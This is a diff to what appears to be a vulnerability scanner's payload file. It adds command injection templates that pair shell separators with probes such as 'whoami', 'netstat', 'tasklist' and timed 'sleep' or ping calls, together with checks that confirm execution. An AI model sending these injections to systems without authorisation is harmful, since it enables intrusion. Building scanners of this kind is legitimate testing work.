@@ -4,6 +4,49 @@
     "payloads": [
     {
         "payload":[
+            "sep 'echo $(([RANDOM_4] * 10))' end",
+            "sep 'whoami; echo $(([RANDOM_4] * 10))' end"
+        ],
+        "verify":["[RANDOM_4]0"],
+        "type": "REGEX",
+        "tags": ["payload_template"],
+        "vars": {
+            "sep": [";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|"],
+            "end":["#", "", "]", "&", ";", "|", "&&", "||"]
+            }
+    },
+    {
+        "payload":[
+            "sep cmd end"
+        ],
+        "verify":["Usage: ar [emulation options]", "help          show this message and exit.", "basename: missing operand", "cut: you must specify a list of bytes, characters, or fields",
+            "missing operand after", "Usage: getconf [-v specification] variable_name [pathname]", "gettext: missing arguments", "Try 'more --help' for more information.",
+            "Missing filename", "missing file operand", "missing operand", "printf: usage: printf [-v var] format [arguments]",
+            ": not found"
+        ],
+        "type": "REGEX",
+        "tags": ["payload_template", "unix"],
+        "vars": {
+            "sep": ["", ";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|", "["],
+            "cmd": ["ar", "awk", "basename", "cut", "diff", "getconf", "gettext", "more", "less", "ln", "mkfifo", "printf"],
+            "end":["#", "", "]", "&", ";", "|", "&&", "||"]
+        }
+    },
+    {
+        "payload":[
+            "sep cmd '[RANDOM_8]' end"
+        ],
+        "verify":["[RANDOM_8]: command not found", ": not found"],
+        "type": "REGEX",
+        "tags": ["payload_template", "unix"],
+        "vars": {
+            "sep": [";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|"],
+            "end":["#", "", "]", "&", ";", "|", "&&", "||"],
+            "cmd":["cat", "echo", ""]
+        }
+    },
+    {
+        "payload":[
             "sep 'echo $(([RANDOM_4] * 10))'",
             "sep 'whoami; echo $(([RANDOM_4] * 10))'"
         ],
@@ -11,6 +54,55 @@
         "type": "REGEX",
         "tags": ["payload_template"],
         "vars": {"sep": [";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|"]}
+    },
+    {
+        "payload":[
+            "sep [RANDOM_5] end",
+            "sep cmd end",
+            "sep {'TRACERT.EXE', 'tracert'} {'localhost', '127.0.0.1', '0x7f.0.0.1', '::1', '0::0:1'} end",
+            "sep {chdir, cd}' [RANDOM_8]' end"
+        ],
+        "verify":[
+            "'[RANDOM_5]' is not recognized as an internal or\\s+external\\s+command\\s+operable program or batch file.",
+            "Active Connections\\s+Proto\\s+Local Address\\s+Foreign Address\\s+State",
+            "Image Name\\s+PID Session Name\\s+Session#\\s+Mem Usage\\s+=?",
+            "command has been deprecated",
+            "Tracing route to ",
+            "Cannot find path",
+            "TaskName\\s+Next Run Time\\s+Status"
+        ],
+        "type": "REGEX",
+        "tags": ["payload_template", "windows"],
+        "vars": {
+            "sep": [";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|"],
+            "cmd":["netstat -an", "tasklist", "at", "schtasks.exe"],
+            "end":["#", "", "]", "&", ";", "|", "&&", "||"]
+            }
+    },
+    {
+        "payload":[
+            "sep 'ping -i 1 -c 3 ' {'localhost', '127.0.0.1', '0x7f.0.0.1', '::1', '0::0:1'} end",
+            "sep 'sleep 3' end"
+        ],
+        "verify":[2],
+        "type": "TIME",
+        "tags": ["payload_template"],
+        "vars": {
+            "sep": [";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|"],
+            "end":["#", "", "]", "&", ";", "|", "&&", "||"]
+            }
+    },
+    {
+        "payload":[
+            "sep {'traceroute', 'tracert', 'TRACERT.EXE'}' -z '{'3', '4'} {'localhost', '127.[RANDOM_1].[RANDOM_2].1', '0x7f.[RANDOM_1].0.1', '::1', '0::0:1'} end"
+        ],
+        "verify":[2],
+        "type": "TIME",
+        "tags": ["payload_template", "unix", "windows"],
+        "vars": {
+            "sep": [";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|"],
+            "end":["#", "", "]", "&", ";", "|", "&&", "||"]
+            }
     }
     ]
 }
